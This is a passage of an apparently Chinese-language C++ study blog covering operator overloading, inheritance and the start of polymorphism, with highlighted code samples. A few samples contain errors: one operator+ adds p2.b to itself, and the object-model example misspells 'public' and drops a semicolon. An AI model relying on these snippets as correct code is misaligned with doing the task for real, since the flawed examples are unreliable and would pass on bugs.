temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br><span class="hljs-comment">//本质p3=operatoe(p1,p2)简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="运算符重载发生函数重载"><a href="#运算符重载发生函数重载" class="headerlink" title="运算符重载发生函数重载"></a>运算符重载发生函数重载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-type">int</span> b;<br>&#125;;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, person&amp; p2)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + p<span class="hljs-number">2.</span>a;<br>temp.b = p<span class="hljs-number">2.</span>b + p<span class="hljs-number">2.</span>b;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br>person <span class="hljs-keyword">operator</span>+(person&amp; p1, <span class="hljs-type">int</span> n)<br>&#123;<br>person temp;<br>temp.a = p<span class="hljs-number">1.</span>a + n;<br>temp.b = p<span class="hljs-number">1.</span>b + n;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>person p1;<br>p<span class="hljs-number">1.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">1.</span>b = <span class="hljs-number">10</span>;<br>person p2;<br>p<span class="hljs-number">2.</span>a = <span class="hljs-number">10</span>;<br>p<span class="hljs-number">2.</span>b = <span class="hljs-number">10</span>;<br>person p3 = p1 + p2;<br>person p4 = p1 + <span class="hljs-number">20</span>;<br><span class="hljs-comment">//本质p3=operatoe(p1,p2)简化为上面的写法</span><br>cout &lt;&lt; <span class="hljs-string">&quot;p3.a=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p3.b=&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>b &lt;&lt; endl;<br>cout &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p4.a=&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;p4.b=&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>b &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结1：对于内置的数据类型的表达式的运算符不能重载</p><p>总结2：不要滥用运算符重载（把加法写成减法等等）</p></blockquote><h3 id="左移运算符重载"><a href="#左移运算符重载" class="headerlink" title="左移运算符重载"></a>左移运算符重载</h3><p>作用：输出自定义数据类型<code>&lt;&lt;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br>     <span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout, person&amp; p);<br>     <span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">//成员函数重载</span><br>    <span class="hljs-comment">//void operator&lt;&lt;(cout)</span><br>    <span class="hljs-comment">//&#123;   </span><br>    <span class="hljs-comment">//&#125;</span><br>    <span class="hljs-comment">//一般不会用成员函数重载&lt;&lt;，应为无法实现cout在左侧</span><br><span class="hljs-keyword">private</span>:<span class="hljs-comment">//一般设置为私有，所以要设置友元</span><br>    <span class="hljs-type">int</span> a;<br>    <span class="hljs-type">int</span> b;<br>&#125;;<br><span class="hljs-comment">//只能利用全局函数重载左移运算符</span><br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout, person&amp; p)<span class="hljs-comment">//本质 operator&lt;&lt;(cout,p)，简化后cout&lt;&lt;p</span><br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;a=&quot;</span> &lt;&lt; p.a &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;b=&quot;</span> &lt;&lt; p.b &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> cout;<span class="hljs-comment">//这样就能继续输出endl，否则只能cout&lt;&lt;p;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p;<br>    p.a = <span class="hljs-number">10</span>;<br>    p.b = <span class="hljs-number">10</span>;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="递增运算符重载"><a href="#递增运算符重载" class="headerlink" title="递增运算符重载"></a>递增运算符重载</h3><p>实现前置递增和后置递增</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br>    <span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout,<span class="hljs-type">const</span> person&amp; p);<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">person</span>()<br>    &#123;<br>        a = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//重载前置++</span><br>    person&amp; <span class="hljs-keyword">operator</span>++()<br>    &#123;<br>        a++;<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//不能返回值，否则是拷贝，两次++不会更改原本的值，返回引用是为了一直对一个数据做递增</span><br>    &#125;<br>    <span class="hljs-comment">//重载后置++</span><br>    person <span class="hljs-keyword">operator</span>++(<span class="hljs-type">int</span>)<span class="hljs-comment">//int是占位参数，用来区分前置和后置</span><br>    &#123;<br>        person temp = *<span class="hljs-keyword">this</span>;<br>        a++;<br>        <span class="hljs-keyword">return</span> temp;<span class="hljs-comment">//这时返回的是值而不是引用，因为这是对局部变量的引用，会报错</span><br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> a;<br>&#125;;<br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; cout,<span class="hljs-type">const</span> person&amp; p)<span class="hljs-comment">//要加const，否则不能接收临时对象，也就是p+</span><br>&#123;<br>    cout &lt;&lt; p.a;<br>    <span class="hljs-keyword">return</span> cout;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    person p;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>    cout &lt;&lt; ++p &lt;&lt; endl;<br>    cout &lt;&lt; p &lt;&lt; endl;<br>    cout &lt;&lt; p++ &lt;&lt; endl;<br>    cout &lt;&lt; p;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：<strong>前置递增返回的是引用，后置递增返回的是值</strong></p><h3 id="赋值运算符重载"><a href="#赋值运算符重载" class="headerlink" title="赋值运算符重载"></a>赋值运算符重载</h3><p>C++至少给一个类添加4个函数</p><ul><li>默认构造函数</li><li>默认析构函数</li><li>默认拷贝函数</li><li>赋值运算符<code>operator=</code>，对属性进行值拷贝</li></ul><p>如果有属性指向堆区，也会出现深浅拷贝的问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> ag)<br>    &#123;<br>        age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(ag);<br>    &#125;<br>    ~<span class="hljs-built_in">person</span>()<br>    &#123;<br>        <span class="hljs-keyword">if</span> (age != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-keyword">delete</span> age;<br>            age = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//重载赋值运算符</span><br>    person&amp; <span class="hljs-keyword">operator</span>=(person&amp; p)<br>    &#123;<br>        <span class="hljs-comment">//编译器提供的是浅拷贝，我们要写的是深拷贝</span><br>        <span class="hljs-comment">//先判断是否有属性在堆上，如果有的话先释放干净</span><br>        &#123;<br>            <span class="hljs-keyword">if</span> (age != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                <span class="hljs-keyword">delete</span> age;<br>                age = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//深拷贝</span><br>        age = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(*p.age);<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<span class="hljs-comment">//可以进行连等，p3=p2=p1;</span><br>    &#125;<br>    <span class="hljs-type">int</span>* age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br>    <span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">20</span>)</span></span>;<br>    <span class="hljs-function">person <span class="hljs-title">p3</span><span class="hljs-params">(<span class="hljs-number">22</span>)</span></span>;<br>    p3 = p2 = p1;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p1=&quot;</span> &lt;&lt; *p<span class="hljs-number">1.</span>age &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p2=&quot;</span> &lt;&lt; *p<span class="hljs-number">2.</span>age &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p3=&quot;</span> &lt;&lt; *p<span class="hljs-number">3.</span>age &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关系运算符重载"><a href="#关系运算符重载" class="headerlink" title="关系运算符重载"></a>关系运算符重载</h3><p>作用：可以让两个自定义数据类型可以进行比较</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">person</span>(<span class="hljs-type">int</span> a)<br>&#123;<br>age=a;<br>&#125;<br><span class="hljs-type">int</span> age;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(person&amp; p)<br>&#123;<br><span class="hljs-keyword">if</span> (age==p.age)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-function">person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span>;<br><span class="hljs-keyword">if</span> (p1==p2)<br>cout&lt;&lt;<span class="hljs-string">&quot;p1与p2相等&quot;</span>&lt;&lt;endl;<br>     <span class="hljs-keyword">else</span><br>          cout&lt;&lt;<span class="hljs-string">&quot;p1与p2不相等&quot;</span>&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他符号都与上面这个类似，只要改几个符号即可，这里只写了<code>==</code></p><h3 id="函数调用运算符的重载"><a href="#函数调用运算符的重载" class="headerlink" title="函数调用运算符的重载"></a>函数调用运算符的重载</h3><ul><li>函数运算符()也可以重载</li><li>重载后使用方式和函数非常像，因此称为仿函数</li><li>仿函数没有固定写法，非常灵活</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">mprint</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//重载函数调用运算符</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(string test)</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; test &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">madd</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> n1, <span class="hljs-type">int</span> n2)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> n1 + n2;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    mprint mp;<br>    <span class="hljs-built_in">mp</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    madd md;<br>    cout &lt;&lt; <span class="hljs-built_in">md</span>(<span class="hljs-number">100</span>, <span class="hljs-number">10</span>) &lt;&lt; endl;<br>    <span class="hljs-comment">//匿名函数对象（执行完立即被释放）</span><br>    cout &lt;&lt; <span class="hljs-built_in">madd</span>()(<span class="hljs-number">100</span>, <span class="hljs-number">20</span>) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">test01</span>();<br>    <span class="hljs-built_in">test02</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><strong>面向对象的三大特性之一</strong></p><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1744274250663.png" alt="继承"></p><p>我们发现在定义这些类时，下级别除了拥有上一级的共性，还有自己的特性</p><p>这里我们就可以利用继承来减少代码量</p><h3 id="继承基本语法"><a href="#继承基本语法" class="headerlink" title="继承基本语法"></a>继承基本语法</h3><ul><li><p>语法：<code>class 子类 : 继承方式 父类</code></p></li><li><p>子类也称派生类</p></li><li><p>父类也称基类</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//继承实现</span><br><span class="hljs-comment">//公共页面类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">basepage</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">header</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;登陆          注册&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-comment">//Java页面</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Java</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Java&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">python</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;python&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cpp</span> : <span class="hljs-keyword">public</span> basepage<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">content</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;C++&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;-----------------&quot;</span> &lt;&lt; endl;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Java ja;<br>    ja.<span class="hljs-built_in">header</span>();<br>    ja.<span class="hljs-built_in">content</span>();<br>    python py;<br>    py.<span class="hljs-built_in">header</span>();<br>    py.<span class="hljs-built_in">content</span>();<br>    cpp cjj;<br>    cjj.<span class="hljs-built_in">header</span>();<br>    cjj.<span class="hljs-built_in">content</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1744274955782.png" alt="效果"></p><p><strong>总结：继承减少重复的代码</strong></p><h3 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h3><ul><li>公共继承</li><li>保护继承</li><li>私有继承</li></ul><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1744607846230.png" alt="继承方式"></p><p><strong>父类私有成员子类访问不到</strong></p><ul><li>公共继承<ul><li>继承父类中的各种属性的权限</li></ul></li><li>保护继承<ul><li>将公共权限变为保护，其它不变，<strong>类内可访问类外不可访问</strong></li></ul></li><li>私有继承<ul><li>全部变成private，<strong>类外全部不能访问</strong></li><li>此时如果又有一个类（子子类）来继承这个子类，那么也无法访问这个子类的属性，因为子类继承父类时变成私有的了，子子类无法访问</li></ul></li></ul><h3 id="继承中的对象模型"><a href="#继承中的对象模型" class="headerlink" title="继承中的对象模型"></a>继承中的对象模型</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">base</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-type">int</span> b;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> c<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span>:puiblic base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> d;<br>&#125;;<br><span class="hljs-built_in">test01</span>()<br>&#123;<br>     cout&lt;&lt;<span class="hljs-string">&quot;size: &quot;</span>&lt;&lt;<span class="hljs-built_in">sizeof</span>(son)&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//结果是16</span><br></code></pre></td></tr></table></figure><p>结论：</p><ul><li>父类中所有非静态成员都会被子类继承</li><li>私有属性也有被继承只不过被隐藏了无法访问而已</li></ul><h3 id="继承中构造和析构函数"><a href="#继承中构造和析构函数" class="headerlink" title="继承中构造和析构函数"></a>继承中构造和析构函数</h3><p>结论：</p><ul><li>父类构造</li><li>子类构造</li><li>子类析构</li><li>父类析构</li></ul><h3 id="继承同名成员的处理方式"><a href="#继承同名成员的处理方式" class="headerlink" title="继承同名成员的处理方式"></a>继承同名成员的处理方式</h3><p>当子类与父类出现同名成员时，如何通过子类访问子类或父类中的同名成员</p><ul><li>子类中的直接访问</li><li>父类通过作用域访问</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">base</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-built_in">base</span>()<br>&#123;<br>a = <span class="hljs-number">100</span>;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span> :<span class="hljs-keyword">public</span> base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> a;<br><span class="hljs-built_in">son</span>()<br>&#123;<br>a = <span class="hljs-number">200</span>;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>son s;<br><span class="hljs-comment">//访问son下的a</span><br>cout &lt;&lt; <span class="hljs-string">&quot;son下的a=&quot;</span> &lt;&lt; s.a &lt;&lt; endl;<br><span class="hljs-comment">//访问base的a</span><br>cout &lt;&lt; <span class="hljs-string">&quot;base下的a=&quot;</span> &lt;&lt; s.base::a &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数同理</p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>C++面向对象三大特性之一</p><h2 id="多态基本概念"><a href="#多态基本概念" class="headerlink" title="多态基本概念"></a>多态基本概念</h2><p>分为两类</p><ul><li>静态多态：函数重载 运算符重载属于静态多态，复用函数名</li><li>动态多态：派生类和虚函数实现运行时的多态</li></ul><p>区别：</p><ul><li>静态多态的函数地址早绑定，编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定，允许阶段确定函数地址</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 